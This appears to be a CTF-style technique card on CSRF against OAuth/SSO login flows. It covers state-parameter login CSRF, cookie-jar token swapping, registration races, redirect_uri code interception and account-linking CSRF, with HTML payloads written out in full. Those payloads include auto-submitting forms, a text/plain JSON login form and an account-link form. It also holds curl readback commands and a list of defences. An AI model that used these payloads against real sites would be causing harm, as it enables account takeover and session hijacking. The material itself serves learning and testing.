# OAuth/SSO CSRF — the flow-level shapes

An OAuth/SSO login is itself a CSRF-able state change — and the
flow's `state`, `nonce`, and cookie-binding are its own attack
surface. The SSOS card's mechanism, generalized.

---

## 1. The OAuth flow's CSRF surface

```text
/authorize?client_id=X&redirect_uri=Y&state=Z&response_type=code
  → a GET that STARTS a login flow — CSRF-able if the state isn't
    session-bound
/callback?code=C&state=Z
  → binds the code to a session — if the state isn't checked, the
    code binds to whoever's session is current
/login / /sso-login
  → a credential-plant — the SSOS shape
```

## 2. The state-parameter CSRF — login CSRF via OAuth

```text
the OAuth 'state' is the CSRF token for the login flow — it binds
the callback to the session that started it. when it's missing or
not session-bound:

1. attacker starts a flow → gets a code for THEIR account
2. a CSRF page fires the callback with that code in the victim's
   browser
3. the victim's session binds to the attacker's account
   → login-CSRF via OAuth
```

```html
<!-- the callback URL the attacker harvested for their own code -->
<script>location='https://sso/callback?code=<attacker-code>&state=x'</script>
```

## 3. The cookie-binding gap — the SSOS shape

```text
the app uses a shared/persistent cookie jar. the SSO token cookie
isn't bound to the visit — a Set-Cookie from ANY response replaces it.

1. a text/plain JSON CSRF to /sso/login → the response's
   Set-Cookie: token=<attacker-session> lands in the shared jar
2. missing SameSite on the token cookie → the cross-site set lands
3. the bot's next read of the jar's token → it IS the attacker's
   session → the bot acts as the attacker
```

```html
<form action="https://sso/login" method="POST" enctype="text/plain">
  <input name='{"u":"me","p":"x","i":"' value='"}'>
</form>
<script>document.forms[0].submit()</script>
```

## 4. The registration-race pairing

```text
when the bot uses a FIXED account name + open registration:
- register the name first → the bot's own registration/login fails
- OR race the registration — your registration lands first → the
  bot's session maps to your record
the login-CSRF then swaps the active session to yours.
```

## 5. The redirect_uri / open-redirect CSRF

```text
an OAuth flow that accepts a redirect_uri — a CSRF that fires the
authorize endpoint with a redirect to a controlled URI leaks the
code/token to the attacker → a code-interception CSRF.
```

## 6. The account-linking CSRF

```text
'link your Google/GitHub account' — a CSRF that links the victim's
account to the ATTACKER's OAuth identity → the attacker logs in
via OAuth and lands in the victim's account.
```

```html
<form action="https://t/link-account" method="POST">
  <input name="provider" value="github">
  <input name="oauth_id" value="attacker-oauth-id">
</form>
```

## 7. The logout-CSRF — the nuisance shape

```html
<img src="https://t/logout">
<!-- logs the victim out — a nuisance, rarely useful alone; pairs
     with a login-CSRF to force a re-login into your account -->
```

## 8. The SSO flow's token-binding audit

```bash
# does the state param bind the session?
# start a flow → capture the state → check if a different session's
# callback with that state still binds
# does the token cookie persist across the jar?
# does the login endpoint accept a foreign-Origin / missing-token?
```

## 9. The "who does the session become" read — the readback

```bash
# after the swap, WHO is the session?
curl -s -b "$ATTACKER_CJ" "$BASE/api/me"   # the attacker-account view
# the flag/secret the victim's bot deposited into your account
curl -s -b "$ATTACKER_CJ" "$BASE/api/flag" | grep -oE '[A-Z]+\{[^}]+\}'
```

## 10. The falsifier

```text
- the OAuth 'state' IS session-bound AND required → the callback-
  CSRF fails
- the SSO token cookie has SameSite=Strict or is per-visit → the
  swap doesn't persist
- the login endpoint needs a token the page can't read → the
  credential-plant fails
- the jar doesn't persist → no cross-cycle state
```

## 11. The ledger

```bash
python3 tools/state.py <c> --hypothesis \
  "oauth-csrf: shared-jar cookie-swap via text/plain login"
```
